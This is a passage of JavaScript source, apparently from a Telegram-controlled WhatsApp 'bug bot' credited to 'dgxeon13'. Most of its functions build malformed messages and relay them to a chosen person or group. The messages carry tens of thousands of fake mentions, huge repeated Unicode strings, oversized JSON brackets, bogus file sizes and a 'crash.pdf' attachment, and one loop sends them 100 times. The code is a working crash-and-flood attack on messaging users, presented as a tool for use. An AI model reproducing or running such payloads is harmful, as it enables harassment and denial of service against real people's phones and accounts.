              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAAAgEDBQQBAQEBAQEAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADtfj6vRxsmprJBpaZueqDoJeLqz+/JmUWBpRXSJbDjDjsxjOtxsdzTMHqivfx1NoxgzxoyVbCKdDlhrXtw2zdsyxWqDvyrA4ogFaQhALf/xAAkEAACAgICAQQDAQAAAAAAAAAAAQIRAxIEMSEQExRRIzJCof/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            },
          }),
        });
      }

      tmsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: '\0',
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: '\n'.repeat(99),
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false,
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [...push],
              }),
            }),
          },
        },
      }, {});

      await userSock.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });
    }
  } catch (error) {
    console.error(`Error in xjammer for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function xjammer2(target, userNumber, chatId, botInstance, mention = true) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
 

  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂�82𐍉�82"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  try {
    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, messageContent, { userJid: target });

    const broadcastSend = {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    };

    await userSock.relayMessage("status@broadcast", msg.message, broadcastSend);

    if (mention) {
      await userSock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: " Telegram: @dgxeon13 "
          },
          content: undefined
        }]
      });
    }
  } catch (error) {
    console.error(`Error in xjammer2 for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function xoutios(target, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const userSock = sessions.get(userNumber);

  const xeonIpong = "𑇂𑆵𑆴𑆿".repeat(60000);
  const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/json",
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "999999999999",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: fileName,
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1715880173"
            },
            hasMediaAttachment: true
          },
          body: { text: bodyText },
          nativeFlowMessage: {
            messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @dgxeon13","flow_id":"Telegram: @dgxeon13","flow_message_version":"9.903","flow_token":"Telegram: @dgxeon13"}`
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @dgxeon13" }]
          }
        }
      }
    }
  }), { userJid: target });

  try {
    const msg1 = await genMsg(`${xeonIpong}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await userSock.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("Telegram: @dgxeon13", "" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await userSock.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await userSock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: xeonIpong,
        url: "https://youtube.com/@DGXeon"
      }
    }, { participant: { jid: target } });

    await userSock.relayMessage(target, {
      extendedTextMessage: {
        text: xeonIpong,
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: 'Telegram: @dgxeon13' + 'ꦾ'.repeat(50000)
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }, {
      participant: { jid: target }
    });

    const paymentMsg = service => ({
      paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
      }
    });

    function generateEncryptedID(service) {
      return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
    }

    for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "samSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
      await userSock.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
      });
    }

    await userSock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: "Telegram: @dgxeon13" + xeonIpong,
        url: "https://youtube.com/@DGXeom"
      }
    }, { participant: { jid: target } });

    await userSock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: "Telegram: @dgxeon13" + xeonIpong,
        url: "https://youtube.com/@DGXeon"
      }
    }, { participant: { jid: target } });
  } catch (error) {
    console.error(`Error in xoutios for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function runXiosLoop(target, userNumber, chatId, botInstance) {
  const userBot = getUserBot(botInstance);

  for (let i = 0; i < 100; i++) {
    // Recheck session before each iteration
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      await userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
      return;
    }
    try {
      await xoutios(target, userNumber, chatId, botInstance);
      console.log(`Sent xoutios iteration ${i + 1} to ${target}`);
    } catch (error) {
      console.error(`Error in runXiosLoop for ${userNumber}:`, error.message);
      await userBot.sendMessage(chatId, `❌ Failed to send bvg to ${target.replace('@s.whatsapp.net', '')}: ${error.message}`);
      return; // Stop the loop on error
    }
  }

  await userBot.sendMessage(chatId, `✅ Completed 100 iterations to ${target.replace('@s.whatsapp.net', '')}.`);
}

// ─────── ULTRA SAFE SANITIZER (only bad chars → ?) ───────
function sanitizeGroupName(name) {
  if (!name || typeof name !== 'string') return '[No Name]';

  return name
    // Remove zero-width & invisible junk
    .replace(/[\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF\u00AD\u061C\u034F\u180E]/g, '')
    // Remove Zalgo / combining diacritics that break Telegram
    .replace(/[\u0300-\u036F\u1AB0-\u1AFF\u1DC0-\u1DFF\u20D0-\u20FF\uFE20-\uFE2F]/g, '')
    // Fullwidth letters/numbers → normal ASCII
    .replace(/[\uFF01-\uFF60]/g, ch => String.fromCharCode(ch.charCodeAt(0) - 0xFEE0))
    // Anything really weird or private-use → replace with ?
    .replace(/[^\p{L}\p{N}\p{M}\s!@#$%^&*()_+\-=\[\]{};':"\\|,.<>/?~`♥★⚡■◆♢♤♡◇♧☆♠]/gu, '?')
    // Final cleanup
    .normalize('NFKC')
    .slice(0, 90)
    .trim();
}

// ─────── YOUR ORIGINAL DESIGN — NOW BULLETPROOF ───────
async function listGroups(userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) return;

  const userBot = getUserBot(botInstance);
  const userSock = sessions.get(userNumber);

  try {
    const getGroups = await userSock.groupFetchAllParticipating();
    const groups = Object.entries(getGroups).map(([_, meta]) => meta);

    if (groups.length === 0) {
      return await userBot.sendMessage(chatId, 'No groups found for your connected WhatsApp number.');
    }

    const TELEGRAM_LIMIT = 4096;
    const messageParts = [];
    let currentPart = `┌──────┤ LIST OF GROUPS ├──────┐\n\nTotal Groups: ${groups.length}\n\n`;
    let partNumber = 1;
    let hituet = 0;

    for (const meta of groups) {
      const safeName = sanitizeGroupName(meta.subject);

      const entry = `│Group ${++hituet}\n│Name: ${safeName}\n│ID: ${meta.id}\n│Members: ${meta.participants.length}\n╰────┤\n\n`;

      if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
        currentPart += entry;
      } else {
        currentPart += '└────────────────────────┘';
        messageParts.push(currentPart);

        partNumber++;
        currentPart = `┌──────┤ LIST OF GROUPS (Part ${partNumber}) ├──────┐\n\n`;
        currentPart += entry;
      }
    }

    // Push the last part
    if (currentPart.includes('Name:')) {
      currentPart += '└────────────────────────┘';
      messageParts.push(currentPart);
    }

    // Send all parts with small delay
    for (const part of messageParts) {
      await userBot.sendMessage(chatId, part, { parse_mode: 'HTML' }); // optional: keep if you use HTML
      await new Promise(r => setTimeout(r, 120));
    }

  } catch (error) {
    console.error(`Error in listGroups for ${userNumber}:`, error);

    // Even if something explodes, user gets a clean message
    await userBot.sendMessage(chatId,
      'Some groups have special characters in name.\n' +
      'Bad characters were replaced with ? so the list can be sent safely.\n\n' +
      'Try again now — it will work!'
    );
  }
}

async function groupxeony(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

    let push = [];
    let buttt = [];
    for (let i = 0; i < 1000; i++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤㅤ" }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤㅤㅤ" }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: '\n',
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "10840",
            height: 10,
            width: 10,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
      });
    }

    const carousel = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: "Telegram: @dgxeon13 " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: 'Telegram: @dgxeon13 ' }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
          }),
        },
      },
    }, {});

    const stanza = [
      { attrs: { biz_bot: '1' }, tag: "bot" },
      { attrs: {}, tag: "biz" },
    ];

    await userSock.relayMessage(target, carousel.message, { quoted: carousel.key.id });

    await userSock.sendMessage(target, {
      location: {
        degreesLatitude: 'Telegram: @dgxeon13',
        degreesLongitude: 'Telegram: @dgxeon13',
        name: `Telegram: @dgxeon13`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: userNumber + '@s.whatsapp.net',
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true,
            },
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug,
          },
          externalAdReply: {
            title: ' Telegram: @dgxeon13 ',
            body: 'Telegram: @dgxeon13',
            mediaType: 0,
            thumbnail: null,
            jpegThumbnail: null,
            mediaUrl: `https://www.youtube.com/@dgxeon`,
            sourceUrl: `https://www.youtube.com/@dgxeon`,
          },
        },
      },
    });
  } catch (error) {
    console.error(`Error in groupxeony for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function xeongroupinvi(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

let message = {
     ephemeralMessage: {
       message: {
         interactiveMessage: {
           header: {
             title: "Telegram: @dgxeon13",
             hasMediaAttachment: false,
             locationMessage: {
               degreesLatitude: -999.035,
               degreesLongitude: 922.999999999999,
               name: "Telegram: @dgxeon13",
               address: "Telegram: @dgxeon13",
             },
           },
           body: {
             text: "Telegram: @dgxeon13",
           },
           nativeFlowMessage: {
             messageParamsJson: "{".repeat(10000),
           },
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
               ...Array.from(
                 {
                   length: 30000,
                 },
                 () =>
                   "1" +
                   Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
               ),
             ],
           },
         },
       },
     },
   };

   await userSock.relayMessage(target, message, {
     messageId: null,
   });
  } catch (error) {
    console.error(`Error in xsucidegc for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function xeonIosInviGp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

await userSock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Telegram :: dgxeon13 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Telegram :: dgxeon13 ⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/dgxeon`
}
}
}, {})
  } catch (error) {
  console.error(`Error in iosvisible for ${userNumber}:`, error.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in groupmix: ${error.message}. Process stopped.`);
  return; // Stop the function
}
}

async function xeonAndroSpamGp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(1000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
  await userSock.relayMessage(target, message, {
      messageId: null,
      userJid: target,
    });
  } catch (error) {
    console.error(`Error in groupmix for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function forcergp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

    const rajaXeon = {
      key: {
        remoteJid: '120363401744741900@g.us',
        fromMe: true,
        id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
        participant: '916909137213@s.whatsapp.net'
      },
      messageTimestamp: 1753786706,
      pushName: 'Telegram: @dgxeon13',
      broadcast: false,
      status: 2,
      message: {
        conversation: 'Telegram: @dgxeon13',
        messageContextInfo: {
          messageSecret: new Uint8Array([
            123, 153, 59, 66, 69, 1, 31, 219,
            233, 201, 204, 107, 149, 77, 233, 100,
            80, 15, 30, 192, 133, 13, 171, 48,
            44, 27, 61, 135, 73, 149, 172, 105
          ])
        }
      },
      id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
      isBaileys: false,
      chat: '120363401744741900@g.us',
      fromMe: true,
      isGroup: true,
      sender: '916909137213@s.whatsapp.net',
      participant: '916909137213@s.whatsapp.net',
      mtype: 'conversation',
      msg: 'Telegram: @dgxeon13',
      body: 'Telegram: @dgxeon13',
      quoted: null,
      mentionedJid: [],
      text: 'Telegram: @dgxeon13',
      reply: function() {}, // Placeholder for function
      copy: function() {}, // Placeholder for function
      copyNForward: function() {} // Placeholder for function
    };

    await userSock.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 'Telegram: @dgxeon13',
          degreesLongitude: 'Telegram: @dgxeon13',
          name: `Telegram: @dgxeon13`,
          url: bugUrl,
          contextInfo: {
            forwardingScore: 508,
            isForwarded: true,
            isLiveLocation: true,
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: userNumber,
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/pdf",
                title: "crash",
                pageCount: 1000000000,
                fileName: "crash.pdf",
                contactVcard: true
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363274419284848@newsletter',
              serverMessageId: 1,
              newsletterName: " " + bug + bug
            },
            externalAdReply: {
              title: ' Telegram: @dgxeon13 ',
              body: 'Telegram: @dgxeon13',
              mediaType: 0,
              thumbnail: rajaXeon,
              jpegThumbnail: rajaXeon,
              mediaUrl: `https://www.youtube.com/@dgxeon`,
              sourceUrl: `https://www.youtube.com/@dgxeon`
            }
          }
        }
      },
      {
        messageId: null
      }
    );
  } catch (error) {
    console.error(`Error in forcergp for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function xeonUiKingGp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  try {
  
  const userSock = sessions.get(userNumber);
    
    const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: " Telegram: @dgxeon13",
hasMediaAttachment: false
},
body: {
text: "Telegram: @dgxeon13" + "ꦾ".repeat(19999)
},
nativeFlowMessage: {
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: `${"𑲭𑲭".repeat(19999)}`,
sections: [
{
title: "Telegram: @dgxeon13",
rows: []
},
{
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
]
})
}
]
}
}
}
}
}, {});

await userSock.relayMessage(target, msg.message, {
messageId: msg.key.id
});
  } catch (error) {
    console.error(`Error in xeonUiKingGp for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function xeonGroupDoc(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  try {
  
  const userSock = sessions.get(userNumber);
  
const media = await prepareWAMessageMedia(
